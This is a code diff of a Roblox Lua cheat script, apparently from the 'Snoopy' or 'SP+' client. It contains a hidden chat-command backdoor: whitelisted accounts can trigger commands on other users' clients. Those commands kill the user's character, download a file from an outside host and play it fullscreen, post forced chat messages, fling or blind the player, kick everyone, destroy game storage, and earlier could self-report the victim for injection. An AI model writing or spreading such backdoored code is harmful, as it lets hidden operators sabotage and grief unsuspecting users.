@@ -1,14 +1,22 @@
-local textchatservice = game:GetService("TextChatService")
+local textChatService = game:GetService("TextChatService")
+
 local allowedplayers = {
-    "noplease_bowls", "SnoopyIs_Better", "wearishdevelopment", 
-    "SnoopyIsBetterThanU1", "iamnotbroke101", "SnoopyPrivate_INC", 
-    "realIronsnow5", "fluxusfrfrfr", "a_pr1vat3", "0PrimeIsAssRealOngFr", 
+    "noplease_bowls",
+    "PlesNoBanSnoopy",
+    "wearishdevelopment",
+    "SnoopyIsBetterThanU1",
+    "iamnotbroke101",
+    "SnoopyPrivate_INC",
+    "realIronsnow5",
+    "fluxusfrfrfr",
+    "0PrimeIsAssRealOngFr",
+    "a_pr1vat3",
     "i_LOVEbowlsREAL"
 }
 
 local function isPlayerAllowed(playerName)
-    for _, name in ipairs(allowedplayers) do
-        if playerName == name then
+    for _, allowedPlayer in ipairs(allowedplayers) do
+        if playerName == allowedPlayer then
             return true
         end
     end
@@ -18,49 +26,58 @@ end
 local commands = {
     kill = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
         end
     end,
     funnyvideo = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local filename = "bruh"
-            local screengui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-            screengui.IgnoreGuiInset = true
-            local video = Instance.new("VideoFrame", screengui)
+            local ScreenGui = Instance.new("ScreenGui")
+            ScreenGui.IgnoreGuiInset = true
+            ScreenGui.Parent = game:GetService("CoreGui")
+            
+            local video = Instance.new("VideoFrame")
             video.Size = UDim2.new(1, 0, 1, 0)
-            local name = filename .. ".mp4"
-            if not isfile(name) then
-                writefile(name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+            video.Parent = ScreenGui
+            
+            local Name = filename .. ".mp4"
+            if not isfile(Name) then
+                writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
             end
-            video.Video = syn and getsynasset(name) or getcustomasset(name)
+            
+            video.Video = syn and getsynasset(Name) or getcustomasset(Name)
+            
             repeat
                 task.wait()
                 print("Retrying...")
             until video.Loaded
+            
             video:Play()
         end
     end,
     reveal = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            textchatservice:Chat(game.Players.LocalPlayer.Name, "hey i use wurst client")
+            local textChatService = game:GetService("TextChatService")
+            textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("SP+ On Top")
         end
     end,
     void = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local character = game.Players.LocalPlayer.Character
-            local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
-            local newposition = humanoidrootpart.CFrame
+            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+            local newPosition = humanoidRootPart.CFrame
             for i = 1, 3 do
-                newposition = newposition + Vector3.new(0, -40, 0)
-                humanoidrootpart.CFrame = newposition
+                newPosition = newPosition + Vector3.new(0, -40, 0)
+                humanoidRootPart.CFrame = newPosition
                 wait(0.01)
             end
         end
     end,
     blind = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            local blur = Instance.new("BlurEffect", game.Lighting)
+            local blur = Instance.new("BlurEffect")
             blur.Size = 10000000000000
+            blur.Parent = game.Lighting
         end
     end,
     unblind = function()
@@ -79,17 +96,8 @@ local commands = {
     kick = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             wait(1)
-            for _, player in ipairs(game.Players:GetPlayers()) do
+            for index, player in pairs(game.Players:GetPlayers()) do
                 player:Kick("Snoopy Owns You")
-            end
-        end
-    end,
-    ban = function()
-        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            local rs = game:GetService("ReplicatedStorage")
-            local remote = rs:FindFirstChild("SelfReport", true)
-            if remote then
-                remote:FireServer("injection_detected")
             end
         end
     end,
@@ -110,10 +118,7 @@ local commands = {
     end,
     lobby = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            local bedwars = game:GetService("ReplicatedStorage"):FindFirstChild("Bedwars")
-            if bedwars then
-                bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-            end
+            game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
         end
     end,
     quit = function()
@@ -127,21 +132,19 @@ local commands = {
                 wait()
                 local player = game.Players.LocalPlayer
                 local character = player.Character or player.CharacterAdded:Wait()
-                local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
-                local forwardvector = humanoidrootpart.CFrame.LookVector
-                local newposition = humanoidrootpart.CFrame.Position + forwardvector * 1000000
-                humanoidrootpart.CFrame = CFrame.new(newposition, newposition + forwardvector)
+                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+                local forwardVector = humanoidRootPart.CFrame.LookVector
+                local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+                humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
             end
         end
     end,
     breakgame = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             pcall(function()
-                local replicatedstorage = game:GetService("ReplicatedStorage")
-                for _, child in ipairs(replicatedstorage:GetDescendants()) do
-                    if child:IsA("Instance") then
-                        child:Destroy()
-                    end
+                local replicatedStorage = game:GetService("ReplicatedStorage")
+                for _, child in ipairs(replicatedStorage:GetDescendants()) do
+                    child:Destroy()
                 end
             end)
         end
@@ -189,7 +192,7 @@ local commands = {
     end,
 }
 
-textchatservice.OnIncomingMessage:Connect(function(message)
+textChatService.OnIncomingMessage = function(message: TextChatMessage)
     local properties = Instance.new("TextChatMessageProperties")
     if message.TextSource then
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
@@ -206,6 +209,5 @@ textchatservice.OnIncomingMessage:Connect(function(message)
             end
         end
     end
-
     return properties
-end)
+end
